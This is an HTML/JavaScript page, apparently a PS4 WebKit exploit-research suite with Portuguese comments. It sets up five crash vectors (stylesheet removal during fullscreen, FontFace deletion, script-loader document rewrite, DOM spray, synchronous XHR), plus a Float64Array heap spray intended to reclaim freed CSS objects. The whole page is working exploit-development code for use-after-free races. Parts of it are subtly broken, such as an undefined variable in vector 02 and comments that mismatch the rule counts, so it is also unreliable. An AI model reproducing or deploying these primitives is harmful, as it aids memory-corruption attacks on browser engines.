<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v280000: CSS Guillotine</title>
<style>
    body { background: #000; color: #ff0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #ff0; }
    .status { border: 1px solid #ff0; padding: 15px; margin-bottom: 20px; font-size: 1.2em; background: #220; color: #fff; }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #440; color: #fff; border: 2px solid #ff0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #ff0; color: #000; }
    
    #stage { background: #111; height: 100px; border: 1px solid #555; margin-top: 20px; display: flex; align-items: center; justify-content: center; }
</style>
</head>
<body>

<h1>v280000: CSS GUILLOTINE</h1>

<div class="status">
    VOLTANDO AO QUE FUNCIONA + ATAQUE DE LAYOUT<br>
    CLIQUE -> FULLSCREEN -> FECHE ALERTA
</div>

<button onclick="guillotine(c01)">01. The Sheet Ripper (CSS Detach)</button>
<button onclick="guillotine(c02)">02. FontFace Delete Race</button>
<button onclick="guillotine(c03)">03. Script Loader Nuke</button>
<button onclick="guillotine(c04)">04. Huge DOM Spray (Memory Pressure)</button>
<button onclick="guillotine(c05)">05. Synchronous XHR Freeze</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');

    // HEAP SPRAY OTIMIZADO (FLOAT64)
    // Usado para sobrescrever ponteiros de objetos CSS liberados
    function spray() {
        const arr = [];
        try {
            // Cria arrays de números flutuantes (muito usados internamente pelo motor de layout)
            for(let i=0; i<5000; i++) {
                const a = new Float64Array(128);
                a.fill(1.123456789e-100); // Padrão de bits específico
                arr.push(a);
            }
        } catch(e) {}
        return arr;
    }

    function guillotine(vectorFunc) {
        Stage.innerHTML = "";
        
        // 1. Configura o vetor
        const target = vectorFunc(Stage);
        
        // 2. Solicita Fullscreen
        // Usa o método padrão e prefixado
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. A Corrida (Baseado na Suite v22 que funcionou)
        requestAnimationFrame(() => {
            setTimeout(() => {
                // Prepara
                if(target._prime) target._prime();

                // CONGELA A THREAD
                window.alert("⚠️ LAYOUT LOCKED ⚠️\n\nAo fechar, o motor CSS tentará ler memória morta.");

                // DETONAÇÃO
                if(target._detonate) {
                    target._detonate();
                    spray(); // Tenta ocupar o espaço liberado imediatamente
                }
            }, 50); // Delay curto para pegar o início da renderização
        });
    }

    // =================================================================
    // 01. The Sheet Ripper
    // Cria 10.000 regras CSS e remove a folha de estilo durante o Fullscreen.
    // O navegador tenta recalcular o layout do elemento fullscreen sem as regras.
    // =================================================================
    function c01(stage) {
        const d = document.createElement('div');
        d.id = "target";
        d.innerHTML = "CSS KILLER";
        stage.appendChild(d);

        // Cria folha de estilo massiva
        const style = document.createElement('style');
        let rules = "";
        for(let i=0; i<2000; i++) {
            rules += `#target { border-${i}: 1px solid red; transform: rotate(${i}deg); } \n`;
        }
        style.textContent = rules;
        document.head.appendChild(style);

        d._detonate = () => {
            // Remove a folha de estilo
            style.remove();
            // Remove o elemento alvo
            d.remove();
            // Força um reflow síncrono em um DOM quebrado
            document.body.offsetWidth; 
        };
        return d;
    }

    // =================================================================
    // 02. FontFace Delete Race
    // Texto em Canvas usa fontes do sistema. Deletar a fonte durante o render
    // é um crash clássico de WebKit.
    // =================================================================
    function c02(stage) {
        const c = document.createElement('canvas');
        c.width = 500; c.height = 500;
        const ctx = c.getContext('2d');
        stage.appendChild(c);

        // Define uma fonte
        const fontName = "CrashFont" + Math.random();
        const f = new FontFace(fontName, "url(data:font/woff;base64,AAAA)"); // Fonte dummy
        document.fonts.add(f);

        d._prime = () => {
            ctx.font = `50px ${fontName}`;
            ctx.fillText("TEST", 50, 50);
        };

        c._detonate = () => {
            // Remove a fonte do conjunto global
            document.fonts.delete(f);
            document.fonts.clear();
            // Tenta desenhar novamente com a fonte morta
            ctx.fillText("CRASH", 100, 100);
            c.remove();
        };
        return c;
    }

    // =================================================================
    // 03. Script Loader Nuke
    // Cria um script e destrói o documento enquanto ele "carrega".
    // =================================================================
    function c03(stage) {
        const d = document.createElement('div');
        d.innerText = "SCRIPT KILLER";
        stage.appendChild(d);

        let s = null;

        d._prime = () => {
            s = document.createElement('script');
            // Script que nunca termina de carregar ou é muito grande
            s.src = "data:text/javascript," + "A".repeat(10000);
            document.body.appendChild(s);
        };

        d._detonate = () => {
            // Remove o script e o container
            s.remove();
            d.remove();
            // Nuke no documento para invalidar o contexto de execução
            document.open();
            document.write("RIP");
            document.close();
        };
        return d;
    }

    // =================================================================
    // 04. Huge DOM Spray (Memory Pressure)
    // Versão turbo do teste que funcionou. Cria milhares de nós.
    // =================================================================
    function c04(stage) {
        const d = document.createElement('div');
        d.innerText = "DOM SPRAY";
        stage.appendChild(d);

        d._detonate = () => {
            d.remove();
            
            // Cria 10.000 spans para fragmentar o heap
            const frag = document.createDocumentFragment();
            for(let i=0; i<10000; i++) {
                const s = document.createElement('span');
                s.innerText = "A";
                frag.appendChild(s);
            }
            document.body.appendChild(frag);
            
            // Depois remove tudo de uma vez
            document.body.innerHTML = "";
        };
        return d;
    }

    // =================================================================
    // 05. Synchronous XHR Freeze
    // Usa uma requisição síncrona (deprecated mas poderosa) para travar
    // o kernel network stack junto com o fullscreen.
    // =================================================================
    function c05(stage) {
        const d = document.createElement('div');
        d.innerText = "SYNC XHR";
        stage.appendChild(d);

        d._detonate = () => {
            d.remove();
            
            // Requisição Síncrona (Bloqueia tudo)
            // Tenta abrir conexão com localhost (rápido, mas gera syscall)
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("GET", window.location.href, false); // FALSE = Síncrono
                xhr.send(null);
            } catch(e) {}
        };
        return d;
    }

</script>
</body>
</html>
